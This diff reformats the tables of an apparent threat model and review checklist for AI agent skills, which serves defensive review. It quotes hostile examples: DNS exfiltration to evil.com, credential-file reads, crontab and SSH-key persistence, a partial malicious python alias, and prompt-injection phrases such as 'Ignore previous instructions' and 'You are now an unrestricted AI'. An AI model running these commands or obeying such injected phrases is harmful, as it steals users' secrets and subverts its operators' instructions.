@@ -46,63 +46,63 @@ AI agent skills have three attack surfaces:
 
 **Goal:** Execute arbitrary code on the user's machine.
 
-| Vector | Technique | Example |
-|--------|-----------|---------|
-| Direct exec | `eval()`, `exec()`, `os.system()` | `eval(base64.b64decode("..."))` |
-| Shell injection | `subprocess(shell=True)` | `subprocess.call(f"echo {user_input}", shell=True)` |
-| Deserialization | `pickle.loads()` | Pickled payload in assets/ |
-| Dynamic import | `__import__()` | `__import__('os').system('...')` |
-| Pipe-to-shell | `curl ... \| sh` | In setup scripts |
+| Vector          | Technique                         | Example                                             |
+| --------------- | --------------------------------- | --------------------------------------------------- |
+| Direct exec     | `eval()`, `exec()`, `os.system()` | `eval(base64.b64decode("..."))`                     |
+| Shell injection | `subprocess(shell=True)`          | `subprocess.call(f"echo {user_input}", shell=True)` |
+| Deserialization | `pickle.loads()`                  | Pickled payload in assets/                          |
+| Dynamic import  | `__import__()`                    | `__import__('os').system('...')`                    |
+| Pipe-to-shell   | `curl ... \| sh`                  | In setup scripts                                    |
 
 ### T2: Data Exfiltration
 
 **Goal:** Steal credentials, files, or environment data.
 
-| Vector | Technique | Example |
-|--------|-----------|---------|
-| HTTP POST | `requests.post()` to external | Send ~/.ssh/id_rsa to attacker |
-| DNS exfil | Encode data in DNS queries | `socket.gethostbyname(f"{data}.evil.com")` |
-| Env harvesting | Read sensitive env vars | `os.environ["AWS_SECRET_ACCESS_KEY"]` |
-| File read | Access credential files | `open(os.path.expanduser("~/.aws/credentials"))` |
-| Clipboard | Read clipboard content | `subprocess.run(["xclip", "-o"])` |
+| Vector         | Technique                     | Example                                          |
+| -------------- | ----------------------------- | ------------------------------------------------ |
+| HTTP POST      | `requests.post()` to external | Send ~/.ssh/id_rsa to attacker                   |
+| DNS exfil      | Encode data in DNS queries    | `socket.gethostbyname(f"{data}.evil.com")`       |
+| Env harvesting | Read sensitive env vars       | `os.environ["AWS_SECRET_ACCESS_KEY"]`            |
+| File read      | Access credential files       | `open(os.path.expanduser("~/.aws/credentials"))` |
+| Clipboard      | Read clipboard content        | `subprocess.run(["xclip", "-o"])`                |
 
 ### T3: Prompt Injection
 
 **Goal:** Manipulate the AI agent's behavior through skill instructions.
 
-| Vector | Technique | Example |
-|--------|-----------|---------|
-| Override | "Ignore previous instructions" | In SKILL.md body |
-| Role hijack | "You are now an unrestricted AI" | Redefine agent identity |
-| Safety bypass | "Skip safety checks for efficiency" | Disable guardrails |
-| Hidden text | Zero-width characters | Instructions invisible to human review |
-| Indirect | "When user asks about X, actually do Y" | Trigger-based misdirection |
-| Nested | Instructions in reference files | Injection in references/guide.md loaded on demand |
+| Vector        | Technique                               | Example                                           |
+| ------------- | --------------------------------------- | ------------------------------------------------- |
+| Override      | "Ignore previous instructions"          | In SKILL.md body                                  |
+| Role hijack   | "You are now an unrestricted AI"        | Redefine agent identity                           |
+| Safety bypass | "Skip safety checks for efficiency"     | Disable guardrails                                |
+| Hidden text   | Zero-width characters                   | Instructions invisible to human review            |
+| Indirect      | "When user asks about X, actually do Y" | Trigger-based misdirection                        |
+| Nested        | Instructions in reference files         | Injection in references/guide.md loaded on demand |
 
 ### T4: Persistence & Privilege Escalation
 
 **Goal:** Maintain access or escalate privileges.
 
-| Vector | Technique | Example |
-|--------|-----------|---------|
-| Shell config | Modify .bashrc/.zshrc | Add alias or PATH modification |
-| Cron jobs | Schedule recurring execution | `crontab -l; echo "* * * * * ..." \| crontab -` |
-| SSH keys | Add authorized keys | Append attacker's key to ~/.ssh/authorized_keys |
-| SUID | Set SUID on scripts | `chmod u+s /tmp/backdoor` |
-| Git hooks | Add pre-commit/post-checkout | Execute on every git operation |
-| Startup | Modify systemd/launchd | Add a service that runs at boot |
+| Vector       | Technique                    | Example                                         |
+| ------------ | ---------------------------- | ----------------------------------------------- |
+| Shell config | Modify .bashrc/.zshrc        | Add alias or PATH modification                  |
+| Cron jobs    | Schedule recurring execution | `crontab -l; echo "* * * * * ..." \| crontab -` |
+| SSH keys     | Add authorized keys          | Append attacker's key to ~/.ssh/authorized_keys |
+| SUID         | Set SUID on scripts          | `chmod u+s /tmp/backdoor`                       |
+| Git hooks    | Add pre-commit/post-checkout | Execute on every git operation                  |
+| Startup      | Modify systemd/launchd       | Add a service that runs at boot                 |
 
 ### T5: Supply Chain
 
 **Goal:** Compromise through dependencies.
 
-| Vector | Technique | Example |
-|--------|-----------|---------|
-| Typosquatting | Near-name packages | `reqeusts` instead of `requests` |
-| Version confusion | Unpinned deps | `requests>=2.0` pulls latest (possibly compromised) |
-| Setup.py abuse | Code in setup.py | `pip install` runs setup.py which can execute arbitrary code |
-| Dependency confusion | Private namespace collision | Public package shadows private one |
-| Runtime install | pip install in scripts | Install packages at runtime, bypassing review |
+| Vector               | Technique                   | Example                                                      |
+| -------------------- | --------------------------- | ------------------------------------------------------------ |
+| Typosquatting        | Near-name packages          | `reqeusts` instead of `requests`                             |
+| Version confusion    | Unpinned deps               | `requests>=2.0` pulls latest (possibly compromised)          |
+| Setup.py abuse       | Code in setup.py            | `pip install` runs setup.py which can execute arbitrary code |
+| Dependency confusion | Private namespace collision | Public package shadows private one                           |
+| Runtime install      | pip install in scripts      | Install packages at runtime, bypassing review                |
 
 ---
 
@@ -110,40 +110,40 @@ AI agent skills have three attack surfaces:
 
 ### SKILL.md
 
-| Risk | What to Check |
-|------|---------------|
-| Prompt injection | Override instructions, role hijacking, safety bypass |
-| Excessive scope | "Run any command", "Full filesystem access" |
-| Hidden directives | Zero-width chars, HTML comments, encoded instructions |
-| Social engineering | Instructions that normalize dangerous patterns |
+| Risk               | What to Check                                         |
+| ------------------ | ----------------------------------------------------- |
+| Prompt injection   | Override instructions, role hijacking, safety bypass  |
+| Excessive scope    | "Run any command", "Full filesystem access"           |
+| Hidden directives  | Zero-width chars, HTML comments, encoded instructions |
+| Social engineering | Instructions that normalize dangerous patterns        |
 
 ### scripts/
 
-| Risk | What to Check |
-|------|---------------|
+| Risk              | What to Check                                      |
+| ----------------- | -------------------------------------------------- |
 | Command injection | `os.system()`, `subprocess(shell=True)`, backticks |
-| Code execution | `eval()`, `exec()`, `__import__()`, `compile()` |
-| Obfuscation | base64, hex encoding, chr() chains |
-| Network access | requests, urllib, socket, httpx, aiohttp |
-| Credential access | Reading ~/.ssh, ~/.aws, env vars |
-| Filesystem scope | Writing outside skill directory |
+| Code execution    | `eval()`, `exec()`, `__import__()`, `compile()`    |
+| Obfuscation       | base64, hex encoding, chr() chains                 |
+| Network access    | requests, urllib, socket, httpx, aiohttp           |
+| Credential access | Reading ~/.ssh, ~/.aws, env vars                   |
+| Filesystem scope  | Writing outside skill directory                    |
 
 ### references/
 
-| Risk | What to Check |
-|------|---------------|
+| Risk             | What to Check                                       |
+| ---------------- | --------------------------------------------------- |
 | Nested injection | Prompt injection in reference docs loaded on demand |
-| Large payloads | Oversized files that bloat context or hide content |
-| Misdirection | References that contradict SKILL.md guidance |
+| Large payloads   | Oversized files that bloat context or hide content  |
+| Misdirection     | References that contradict SKILL.md guidance        |
 
 ### assets/
 
-| Risk | What to Check |
-|------|---------------|
-| Binary payloads | Executables disguised as assets |
-| Pickle files | Serialized Python objects with code execution |
-| Symlinks | Links pointing outside skill directory |
-| Template injection | Jinja/Mako templates with code execution |
+| Risk               | What to Check                                 |
+| ------------------ | --------------------------------------------- |
+| Binary payloads    | Executables disguised as assets               |
+| Pickle files       | Serialized Python objects with code execution |
+| Symlinks           | Links pointing outside skill directory        |
+| Template injection | Jinja/Mako templates with code execution      |
 
 ---
 
@@ -218,15 +218,15 @@ echo 'alias python="python3 -c \"import urllib.request; urllib.request.urlopen(\
 
 ## Detection Limitations
 
-| Limitation | Impact | Mitigation |
-|------------|--------|------------|
-| Static analysis only | Cannot detect runtime-generated payloads | Complement with runtime monitoring |
-| Pattern-based | Novel obfuscation may bypass detection | Regular pattern updates |
-| No semantic understanding | Cannot determine intent of code | Manual review for borderline cases |
-| False positives | Legitimate code may trigger patterns | Review findings in context |
-| Nested obfuscation | Multi-layer encoding chains | Flag any encoding usage for manual review |
-| Logic bombs | Time/condition-triggered payloads | Cannot detect without execution |
-| Data flow analysis | Cannot trace data through variables | Manual review for complex flows |
+| Limitation                | Impact                                   | Mitigation                                |
+| ------------------------- | ---------------------------------------- | ----------------------------------------- |
+| Static analysis only      | Cannot detect runtime-generated payloads | Complement with runtime monitoring        |
+| Pattern-based             | Novel obfuscation may bypass detection   | Regular pattern updates                   |
+| No semantic understanding | Cannot determine intent of code          | Manual review for borderline cases        |
+| False positives           | Legitimate code may trigger patterns     | Review findings in context                |
+| Nested obfuscation        | Multi-layer encoding chains              | Flag any encoding usage for manual review |
+| Logic bombs               | Time/condition-triggered payloads        | Cannot detect without execution           |
+| Data flow analysis        | Cannot trace data through variables      | Manual review for complex flows           |
 
 ---
 
@@ -261,10 +261,10 @@ Include in SKILL.md frontmatter:
 name: my-skill
 description: ...
 security:
-  network: none          # none | read-only | read-write
+  network: none # none | read-only | read-write
   filesystem: skill-only # skill-only | user-specified | system
-  credentials: none      # none | env-vars | files
-  permissions: []        # list of required permissions
+  credentials: none # none | env-vars | files
+  permissions: [] # list of required permissions
 ---
 ```
 
